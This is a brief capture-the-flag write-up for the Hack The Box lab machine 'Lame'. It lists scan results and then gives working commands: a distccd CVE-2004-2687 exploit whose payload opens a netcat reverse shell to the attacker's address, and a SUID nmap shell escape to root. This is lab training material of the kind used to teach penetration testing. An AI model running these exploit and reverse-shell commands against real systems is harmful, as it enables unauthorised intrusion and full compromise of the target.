# Lame (HTB beginner track)  

## Nmap  

Ports 0-15000.  

```
21/tcp   open  ftp         syn-ack vsftpd 2.3.4
22/tcp   open  ssh         syn-ack OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     syn-ack distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
```  

smb OS discovery.  

```
smb-os-discovery: 
OS: Unix (Samba 3.0.20-Debian)
Computer name: lame
NetBIOS computer name: 
Domain name: hackthebox.gr
FQDN: lame.hackthebox.gr
```  

## Shell  

Using the vulnerability of the distccd service.  

`nmap -Pn -p 3632 10.129.245.76 --script distcc-cve2004-2687 --script-args=distcc-cve2004-2687.cmd='nc -e /bin/bash 10.10.14.85 4444'`  

## Priv esc  

Finding nmap with a SUID bit set.  

```
nmap --interactive
nmap !sh
# whoami
# root
```
